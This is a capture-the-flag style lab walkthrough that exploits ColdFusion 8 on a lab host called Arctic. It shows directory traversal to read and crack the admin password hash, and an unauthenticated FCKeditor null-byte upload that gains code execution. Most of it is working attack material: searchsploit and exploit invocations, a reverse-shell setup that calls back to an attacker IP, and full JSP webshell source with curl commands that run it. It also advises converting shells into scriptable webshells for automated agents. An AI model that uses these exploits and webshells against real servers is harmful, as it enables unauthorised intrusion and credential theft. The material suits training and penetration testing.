# Section 24 — Attacking ColdFusion

Once §23 fingerprinted **ColdFusion 8** (Arctic), exploitation is a known-CVE hunt. Two CF8 bugs matter:

| CVE | Name | Auth? | Outcome |
|-----|------|-------|---------|
| **CVE-2010-2861** | Directory Traversal (`locale` param) | none | Read arbitrary files → steal `password.properties` (admin SHA-1) |
| **CVE-2009-2265** | FCKeditor arbitrary file upload | none | Upload `.jsp` → **unauth RCE** |

> Both are unauthenticated. The traversal gets you the admin panel (crack the hash, log in, scheduled-task RCE — the long way). The FCKeditor upload gets you a shell **directly** — that's the fast path and the one used here.

---

## Step 0 — Find the exploits

```bash
searchsploit adobe coldfusion
searchsploit -m multiple/remote/14641.py     # CVE-2010-2861 directory traversal
searchsploit -m cfm/webapps/50057.py         # CVE-2009-2265 RCE
```
> `searchsploit` queries the local Exploit-DB mirror (`/usr/share/exploitdb`). `-m` mirrors a copy into the cwd. For CF8 the two hits that matter are **14641** (traversal) and **50057** (RCE). Always read an exploit before running it (`cat 50057.py`) — these run network actions and often need IPs hardcoded.

---

## Path A — CVE-2010-2861 Directory Traversal (read the admin hash)

Vulnerable endpoints (the `locale` parameter is concatenated into a file path unsanitised):
```
CFIDE/administrator/settings/mappings.cfm
logging/settings.cfm
datasources/index.cfm
j2eepackaging/editarchive.cfm
CFIDE/administrator/enter.cfm
```

```bash
python2 14641.py 10.129.100.114 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```
> The script abuses `?locale=<traversal>` on the endpoints above to read any file. `password.properties` (in `[cf_root]/lib`, i.e. `C:\ColdFusion8\lib\`) holds the **ColdFusion Administrator** password as an unsalted **SHA-1** hash:
> ```
> password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
> rdspassword=...
> encrypted=true
> ```
> Crack it offline — it's plain SHA-1, no salt:
```bash
echo '2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03' > cf.hash
hashcat -m 100 cf.hash /usr/share/wordlists/rockyou.txt
# Arctic's hash cracks to: happyday
```
> `-m 100` = raw SHA-1. With the cleartext you log into `/CFIDE/administrator/` and get RCE via **Scheduled Tasks** (schedule a task that fetches a CFM/JSP shell) or the **packaging/deploy** feature. Slower than Path B but works when the FCKeditor upload is patched/removed.

---

## Path B — CVE-2009-2265 FCKeditor Unauth Upload → RCE (fast path)

The FCKeditor connector ships enabled in CF8 and lets anyone upload a file:
```
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
        ?Command=FileUpload&Type=File&CurrentFolder=/<name>.jsp%00
```
> The `CurrentFolder=/<name>.jsp%00` **null-byte truncation** is the whole trick: you POST a file named `<name>.txt` (passes the extension filter), but the `%00` makes the server save it as **`<name>.jsp`** under `/userfiles/file/`. JRun then executes the `.jsp`. Upload success = response `OnUploadCompleted( 0, ... )` (the `0` = success).

### B1 — Stock exploit (interactive reverse shell)

`50057.py` — set the four vars, run:
```python
lhost = '10.10.17.176'   # your tun0 IP  (ip -br a show tun0)
lport = 4444
rhost = '10.129.100.114'  # target
rport = 8500
```
```bash
python3 50057.py     # msfvenom java/jsp_shell_reverse_tcp -> nc listener -> shell
```
> Generates an msfvenom JSP reverse shell, uploads it, starts `nc -nlvp 4444`, then triggers `/userfiles/file/<name>.jsp`. Works, but you get an **interactive** shell — fine manually, awkward to script. Arctic is slow: the callback can take 60–90s, be patient.

### B2 — Webshell variant (non-interactive — used to verify Q1)

Swap the reverse-shell payload for a **command webshell** so any command is a single HTTP request — no listener, no interactive session, scriptable:

```python
# JSP dropped via the same FCKeditor upload:
<%@ page import="java.util.*,java.io.*"%>
<% String c=request.getParameter("cmd");
   if(c!=null){ Process p=Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",c});
   BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
   String l; while((l=r.readLine())!=null){ out.println(l); } } %>
```
```bash
# after upload lands at /userfiles/file/<name>.jsp :
curl "http://10.129.100.114:8500/userfiles/file/<name>.jsp?cmd=whoami"
```
> Same CVE, same upload request — only the payload changes. A `?cmd=` webshell is far better for headless/automated work (CI, agents, scoped enumeration) and for grabbing single answers like "what user is it running as." Set generous HTTP timeouts (~120s) — Arctic responds slowly. Full adapted script: `/tmp/cf_rce.py` (this kit).

---

## ✅ Verified result (ACADEMY-ACA-ARCTIC, 10.129.100.114)

```
GET /userfiles/file/<name>.jsp?cmd=whoami      -> arctic\tolis
GET ...?cmd=hostname & ver                     -> arctic / Windows [Version 6.1.7600]
GET ...?cmd=whoami /all                         -> SeImpersonatePrivilege  Enabled
```

**§24 Q1 — "What user is ColdFusion running as?" → `arctic\tolis`**

> Runtime value → verified by live RCE, not copied from a writeup (the §22 rule). The box is **Windows Server 2008 R2 RTM (6.1.7600)**. ColdFusion runs as `arctic\tolis`, a normal user **but with `SeImpersonatePrivilege`** → trivial SYSTEM via **PrintSpoofer / GodPotato / JuicyPotato** (sets up the Windows Privilege Escalation module — note it for later).

---

## Exam Notes

- **CF8 → two unauth wins:** CVE-2010-2861 (traversal, read `[cf_root]\lib\password.properties`) and CVE-2009-2265 (FCKeditor `.jsp` upload RCE). Try the upload first — direct shell.
- **`password.properties` hash is unsalted SHA-1** → `hashcat -m 100`. Arctic = `happyday`.
- **The upload trick is the `%00` null byte in `CurrentFolder`** (filename `.txt` on the wire, saved `.jsp`). Uploaded files execute from `/userfiles/file/`.
- **Convert reverse-shell exploits to `?cmd=` webshells** when you need to script, automate, or just answer one question — no listener, no interactivity, single request. (Same philosophy as §22's headless harness.)
- **Slow target:** raise timeouts to ~90–120s; "no response" often just means "not done yet."
- **Post-exploit recon reflex:** `whoami /priv` immediately — `SeImpersonate`/`SeAssignPrimaryToken` = Potato → SYSTEM.
- Set `lhost` to your **tun0** IP (`ip -br a show tun0`), never the box IP.

---

## Lab Walkthrough (quick steps)

```
1. searchsploit adobe coldfusion ; searchsploit -m cfm/webapps/50057.py
2. (Path A) python2 14641.py <ip> 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
   -> SHA1 hash -> hashcat -m 100 -> happyday -> CF admin -> scheduled-task RCE
3. (Path B) FCKeditor upload .jsp via upload.cfm?...CurrentFolder=/x.jsp%00
   - B1: 50057.py (set lhost=tun0, rhost=target) -> reverse shell
   - B2: webshell payload -> curl /userfiles/file/x.jsp?cmd=whoami   (used here)
4. whoami -> arctic\tolis        ✅  (= §24 Q1 answer; verified live)
5. whoami /priv -> SeImpersonatePrivilege -> Potato -> SYSTEM (next: Win privesc)
```

> Discovery (§23) gave the version; attack (§24) is just "pick the CVE for that version." The FCKeditor `%00` upload is the cleanest CF8 shell; turning it into a `?cmd=` webshell made answering Q1 a one-liner.
